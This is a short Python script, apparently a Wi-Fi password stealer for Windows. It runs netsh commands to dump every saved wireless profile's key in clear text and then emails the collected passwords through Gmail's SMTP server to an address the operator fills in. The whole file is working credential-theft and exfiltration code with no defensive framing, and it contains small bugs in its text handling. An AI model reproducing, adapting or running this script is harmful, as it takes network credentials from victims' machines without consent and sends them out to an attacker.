import subprocess, re, smtplib

def send_mail(email, password, messages):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email, email, messages)
    server.quit()

def fetch_password():
    get_names = subprocess.check_output('netsh wlan show profiles', shell=True)
    extract_names = re.findall(r'(Profile\s*:\s)(.*)',str(get_names))
    result = ""
    for names in extract_names:
        command = "netsh wlan show profile name="+names[1].strip()+" key=clear"
        get_info = subprocess.check_output(command, shell=True)
        get_password=re.search(r'Key Content\s*:\s(.*)',get_info).group(1)
        details="\n"+names[1].strip()+" -----> "+get_password.strip()
        result=result+details
    return result
passwords = fetch_password()
send_mail('email','password',passwords) # ADD your email and password